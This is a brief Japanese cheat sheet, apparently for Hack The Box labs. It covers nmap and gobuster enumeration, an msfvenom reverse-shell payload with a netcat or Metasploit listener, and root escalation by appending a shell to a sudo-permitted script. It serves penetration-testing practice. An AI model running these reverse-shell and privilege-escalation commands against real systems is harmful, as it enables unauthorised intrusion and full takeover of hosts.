---
title: HTB CheatSheet
---

## Enumeration

### Nmap

ポートの特定を行う。

```bash
nmap -sC -sV -oN nmap/initial $IP
```

### Gobuster

Webサーバが公開しているファイルやディレクトリの特定を行う。

```bash
gobuster dir -u http://${IP} -w /usr/share/wordlists/dirb/common.txt

gobuster dir -u http://${IP} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt -k
```

### Nikto

## Foothold

### Create Payload

ペイロードを作成する。

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=172.0.0.1 LPORT=4444 -f elf -o shell.elf
```

### Reverse Shell

作成したペイロードを実行し、リバースシェルを確立する。

```bash
nc -lvnp 4444

msfconsole
use exploit/multi/handler
set payload linux/x64/shell_reverse_tcp
run (exploit)
```

## Privilege Escalation

### Linux

sudo権限の確認を行う。

```bash
sudo -l
```

上のコマンドで、`(root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh` という結果が得られた場合、monitor.shを編集することで、root権限でコマンドを実行できる。

```bash
echo "/bin/bash -i" >> /home/nibbler/personal/stuff/monitor.sh
sudo ./monitor.sh
```
